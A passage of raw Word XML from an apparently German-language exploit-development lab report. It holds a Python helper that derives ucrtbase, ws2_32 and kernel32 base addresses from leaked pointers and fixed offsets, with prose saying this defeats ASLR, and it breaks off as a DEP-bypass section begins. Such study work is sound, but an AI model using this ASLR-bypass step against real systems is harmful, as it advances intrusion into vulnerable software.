          <w:p w14:paraId="05A0B63F" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    offSet_UcrtBase = int('CE76C', 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="017C3362" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseUcrtbase = leakedAdresses[27][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14CBD553" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseUcrtbase_int = int(leakedAdresseUcrtbase, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AC396C2" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseUcrtBase = hex(leakedAdresseUcrtbase_int - offSet_UcrtBase)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C7B925D" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5BAAE1EF" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="45AA7A3F" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    #calculation of ws2_32 base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3820965C" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    offSet_WS2_32 = int('6C19', 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5535083C" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseWS2_32 = leakedAdresses[0][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E89C434" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseWS2_32_int = int(leakedAdresseWS2_32, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3638FA00" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseWS2_32 = hex(leakedAdresseWS2_32_int - offSet_WS2_32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42DB9643" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7D204E05" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # calculation of kernel32 base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B5E132C" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    offSet_Kernel32 = int('4EF6C', 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4312547A" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_1 = leakedAdresses[157][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="313FAFD4" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_2 = leakedAdresses[158][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="734913E1" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_1_int = int(leakedAdresseKernel32_1, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="558CA3F6" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_2_int = int(leakedAdresseKernel32_2, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F7AECB6" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseKernel32_1 = hex(leakedAdresseKernel32_1_int - offSet_Kernel32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79D7BB82" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseKernel32_2 = hex(leakedAdresseKernel32_2_int - offSet_Kernel32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64416FAC" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3D6606A8" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0E1A2776" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1C6897D6" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    if len(baseKernel32_1) == 10:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7395A888" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return baseUcrtBase, baseWS2_32, baseKernel32_1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F6F67A9" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    else:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FE89AC7" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return baseUcrtBase, baseWS2_32, baseKernel32_2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1986C313" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="61F67044" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def main():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="463DBBAB" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    base_ucrtbase_DLL, base_WS2_32_dll, base_kernel32_dll = getAslrBase()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4955563A" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print(base_ucrtbase_DLL, base_WS2_32_dll, base_kernel32_dll)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69D9D75E" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1362A065" w14:textId="65282B5B" w:rsidR="006F1783" w:rsidRPr="00B47CB9" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>main()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006F1783" w:rsidRPr="00B47CB9" w14:paraId="5F337679" w14:textId="77777777" w:rsidTr="006F1783">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01B6DC70" w14:textId="1AAEBF1C" w:rsidR="006F1783" w:rsidRPr="00B47CB9" w:rsidRDefault="006F1783" w:rsidP="004D017F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Leaked_ad</w:t>
            </w:r>
            <w:r w:rsidR="0003483A" w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>r</w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>esses_2.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0E42DB02" w14:textId="44B91B97" w:rsidR="006F1783" w:rsidRPr="00B47CB9" w:rsidRDefault="006F1783" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15131031" w14:textId="34C3F347" w:rsidR="0058466B" w:rsidRPr="00B47CB9" w:rsidRDefault="0058466B" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das Skript ließt nun aus der generieten txt Datei jede Zeile aus und speichert sie in eine Array. </w:t>
      </w:r>
      <w:r w:rsidR="006B7435" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend wird für die drei benötigten DLLs die Base berechnet. </w:t>
      </w:r>
      <w:r w:rsidR="005D79F2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Verwendet werden dazu die Werte der </w:t>
      </w:r>
      <w:r w:rsidR="00B77FE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>geleakten</w:t>
      </w:r>
      <w:r w:rsidR="005D79F2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Adressen und </w:t>
      </w:r>
      <w:r w:rsidR="00B77FE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">das kalkulierte Offset. </w:t>
      </w:r>
      <w:r w:rsidR="00D57111" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der String wird gekürzt und zu einem Hex </w:t>
      </w:r>
      <w:r w:rsidR="00697F50" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Integer</w:t>
      </w:r>
      <w:r w:rsidR="00D57111" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> umgewandelt, damit </w:t>
      </w:r>
      <w:r w:rsidR="00417170" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Baseadresse berechnet werden kann. Anschließend folgt eine Überprüfung, </w:t>
      </w:r>
      <w:r w:rsidR="0049689B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">welche der Kernel32 Adressen die Richtige ist (Zeile </w:t>
      </w:r>
      <w:r w:rsidR="00E613BC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">158 oder 159 im txt File) und die Baseadressen werden returniert und </w:t>
      </w:r>
      <w:r w:rsidR="005607E4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>auf der Konsole ausgegeben.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD94F1A" w14:textId="5ABC8025" w:rsidR="002A6C64" w:rsidRPr="00B47CB9" w:rsidRDefault="002A6C64" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8CF445" w14:textId="6628B935" w:rsidR="002A6C64" w:rsidRPr="00B47CB9" w:rsidRDefault="002A6C64" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ergebnis Skript</w:t>
      </w:r>
      <w:r w:rsidR="00D018A9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (ucrtbase, </w:t>
      </w:r>
      <w:r w:rsidR="00B8761A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>WS2_32, Kernel32)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E2C6BB" w14:textId="54EECD79" w:rsidR="002A6C64" w:rsidRPr="00B47CB9" w:rsidRDefault="002A6C64" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="684D771E" w14:textId="426A0191" w:rsidR="002A6C64" w:rsidRPr="00B47CB9" w:rsidRDefault="002A6C64" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74BCD14C" wp14:editId="351359D5">
            <wp:extent cx="5759450" cy="297815"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>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759450" cy="297815"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CAF290" w14:textId="5189520E" w:rsidR="002A6C64" w:rsidRPr="00B47CB9" w:rsidRDefault="002A6C64" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55757489" w14:textId="1CEC89D1" w:rsidR="002A6C64" w:rsidRPr="00B47CB9" w:rsidRDefault="00326920" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65B82095" wp14:editId="03ACFD08">
            <wp:extent cx="5759450" cy="2000885"/>
            <wp:effectExtent l="0" t="0" r="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2000885"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="396FE574" w14:textId="14C25468" w:rsidR="00CE7A3F" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE7A3F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E2CD545" w14:textId="721A25C8" w:rsidR="00CE7A3F" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE7A3F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Vergleich man das Ergebnis des Skript</w:t>
      </w:r>
      <w:r w:rsidR="00174828" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> mit </w:t>
      </w:r>
      <w:r w:rsidR="00174828" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>der mit „mona modules“ enthaltenen Base Adresse der DLLs kann festgestellt werden, dass das Skript funktioniert</w:t>
      </w:r>
      <w:r w:rsidR="007E6329" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, da die Adressen ident sind. Somit gilt ASLR </w:t>
      </w:r>
      <w:r w:rsidR="00902BAD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mithilfe von Address Leakage umgangen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0037B213" w14:textId="77777777" w:rsidR="00CE7A3F" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE7A3F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43FAFDC9" w14:textId="1E90A5DF" w:rsidR="00326920" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE7A3F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="062C9761" wp14:editId="211FB93D">
            <wp:extent cx="5759450" cy="4183039"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="25" name="Grafik 25" descr="Image tagged in bingo - Imgf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Image tagged in bingo - Imgflip"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId67">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect b="3196"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5759450" cy="4183039"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3820A6" w14:textId="3A494278" w:rsidR="00CE7A3F" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE7A3F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2787B7FB" w14:textId="77777777" w:rsidR="00CE7A3F" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE7A3F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BDDB64C" w14:textId="77777777" w:rsidR="00326920" w:rsidRPr="00B47CB9" w:rsidRDefault="00326920" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="010BAAB9" w14:textId="1E73D155" w:rsidR="000F7672" w:rsidRPr="00B47CB9" w:rsidRDefault="00DE59A8">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6476CF4D" w14:textId="75E0C5FC" w:rsidR="006E2E15" w:rsidRPr="00B47CB9" w:rsidRDefault="0088114A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der n</w:t>
      </w:r>
      <w:r w:rsidR="00736AC5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ächste Schritt bestand darin die Data Execution Prev</w:t>
      </w:r>
      <w:r w:rsidR="006F157E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
